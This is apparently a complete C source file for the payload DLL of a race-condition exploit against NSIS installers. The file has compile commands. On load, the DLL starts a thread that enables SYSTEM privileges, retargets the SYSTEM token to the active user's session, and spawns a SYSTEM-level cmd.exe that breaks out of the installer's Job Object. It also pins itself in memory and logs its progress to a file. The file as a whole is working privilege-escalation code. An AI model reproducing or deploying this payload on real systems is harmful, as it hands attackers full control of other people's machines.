/*
 * payload_cmd.c - SYSTEM shell payload for NSIS race exploit
 *
 * DllMain starts a worker thread to avoid loader-lock deadlocks.
 * The thread enables privileges, finds the active user session,
 * queries the user token, and spawns cmd.exe on the user's desktop
 * with CREATE_BREAKAWAY_FROM_JOB so it survives NSIS's Job Object.
 *
 * Compile (x86):
 *   i686-w64-mingw32-gcc -shared -o payload_cmd.dll payload_cmd.c \
 *       -lkernel32 -ladvapi32 -lwtsapi32
 *   i686-w64-mingw32-strip payload_cmd.dll
 */

#include <windows.h>

#define WTS_CURRENT_SERVER_HANDLE ((HANDLE)NULL)

typedef enum _WTS_CONNECTSTATE_CLASS {
    WTSActive,
    WTSConnected,
    WTSConnectQuery,
    WTSShadow,
    WTSDisconnected,
    WTSIdle,
    WTSListen,
    WTSReset,
    WTSDown,
    WTSInit
} WTS_CONNECTSTATE_CLASS;

typedef struct _WTS_SESSION_INFOW {
    DWORD SessionId;
    LPWSTR pWinStationName;
    WTS_CONNECTSTATE_CLASS State;
} WTS_SESSION_INFOW, *PWTS_SESSION_INFOW;

typedef BOOL (WINAPI *pWTSEnumerateSessionsW)(
    HANDLE, DWORD, DWORD, PWTS_SESSION_INFOW *, DWORD *);
typedef BOOL (WINAPI *pWTSQueryUserToken)(ULONG, PHANDLE);
typedef void (WINAPI *pWTSFreeMemory)(PVOID);
typedef DWORD (WINAPI *pWTSGetActiveConsoleSessionId)(void);

static void WriteMarker(const char *msg)
{
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\Temp\\race_won.txt",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return;
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buf[512];
    int len = wsprintfA(buf, "[%04d-%02d-%02d %02d:%02d:%02d] PID=%lu %s\r\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        (unsigned long)GetCurrentProcessId(), msg);
    DWORD written;
    WriteFile(hFile, buf, (DWORD)len, &written, NULL);
    CloseHandle(hFile);
}

static BOOL EnablePrivilege(HANDLE hToken, LPCSTR privName)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, privName, &luid))
        return FALSE;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

static void EnableRequiredPrivileges(void)
{
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        EnablePrivilege(hToken, "SeTcbPrivilege");
        EnablePrivilege(hToken, "SeAssignPrimaryTokenPrivilege");
        EnablePrivilege(hToken, "SeIncreaseQuotaPrivilege");
        CloseHandle(hToken);
    }
}

static DWORD FindActiveUserSession(void)
{
    HMODULE hWts = LoadLibraryA("wtsapi32.dll");
    if (!hWts)
        return 0xFFFFFFFF;

    pWTSEnumerateSessionsW enumFn =
        (pWTSEnumerateSessionsW)GetProcAddress(hWts, "WTSEnumerateSessionsW");
    pWTSFreeMemory freeFn =
        (pWTSFreeMemory)GetProcAddress(hWts, "WTSFreeMemory");
    pWTSGetActiveConsoleSessionId consoleFn =
        (pWTSGetActiveConsoleSessionId)GetProcAddress(
            GetModuleHandleA("kernel32.dll"), "WTSGetActiveConsoleSessionId");

    DWORD target = 0xFFFFFFFF;

    if (enumFn && freeFn) {
        PWTS_SESSION_INFOW sessions = NULL;
        DWORD count = 0;
        if (enumFn(WTS_CURRENT_SERVER_HANDLE, 0, 1, &sessions, &count)) {
            for (DWORD i = 0; i < count; i++) {
                if (sessions[i].State == WTSActive && sessions[i].SessionId != 0) {
                    target = sessions[i].SessionId;
                    break;
                }
            }
            freeFn(sessions);
        }
    }

    if (target == 0xFFFFFFFF && consoleFn)
        target = consoleFn();

    FreeLibrary(hWts);
    return target;
}

static DWORD WINAPI PayloadThread(LPVOID param)
{
    (void)param;

    WriteMarker("payload_cmd thread started");

    EnableRequiredPrivileges();

    DWORD sessionId = FindActiveUserSession();
    if (sessionId == 0xFFFFFFFF) {
        WriteMarker("no active session found");
        return 1;
    }

    {
        char buf[128];
        wsprintfA(buf, "target session = %lu", (unsigned long)sessionId);
        WriteMarker(buf);
    }

    HANDLE hSelf = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hSelf)) {
        char buf[128];
        wsprintfA(buf, "OpenProcessToken failed, error=%lu",
                  (unsigned long)GetLastError());
        WriteMarker(buf);
        return 1;
    }

    HANDLE hToken = NULL;
    if (!DuplicateTokenEx(hSelf, MAXIMUM_ALLOWED, NULL,
                          SecurityImpersonation, TokenPrimary, &hToken)) {
        char buf[128];
        wsprintfA(buf, "DuplicateTokenEx failed, error=%lu",
                  (unsigned long)GetLastError());
        WriteMarker(buf);
        CloseHandle(hSelf);
        return 1;
    }
    CloseHandle(hSelf);

    if (!SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId))) {
        char buf[128];
        wsprintfA(buf, "SetTokenInformation(session=%lu) failed, error=%lu",
                  (unsigned long)sessionId, (unsigned long)GetLastError());
        WriteMarker(buf);
        CloseHandle(hToken);
        return 1;
    }

    WriteMarker("got SYSTEM token for user session, spawning cmd.exe");

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.lpDesktop = "WinSta0\\Default";

    BOOL created = CreateProcessAsUserA(hToken,
        "C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE | CREATE_BREAKAWAY_FROM_JOB,
        NULL, NULL, &si, &pi);

    if (created) {
        char buf[128];
        wsprintfA(buf, "SUCCESS: cmd.exe PID=%lu session=%lu",
                  (unsigned long)pi.dwProcessId, (unsigned long)sessionId);
        WriteMarker(buf);
    } else {
        char buf[128];
        wsprintfA(buf, "CreateProcessAsUser failed, error=%lu",
                  (unsigned long)GetLastError());
        WriteMarker(buf);
    }

    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    CloseHandle(hToken);
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved)
{
    if (dwReason != DLL_PROCESS_ATTACH)
        return TRUE;

    CreateMutexA(NULL, TRUE, "Global\\IMEPayloadCmd");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        return TRUE;

    /* Pin this module so NSIS cannot unload it before the worker thread
       runs. Without this, FreeLibrary from NSIS removes the code page
       and the thread silently dies. */
    HMODULE pinned;
    GetModuleHandleExW(
        GET_MODULE_HANDLE_EX_FLAG_PIN | GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        (LPCWSTR)DllMain, &pinned);

    CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
    return TRUE;
}
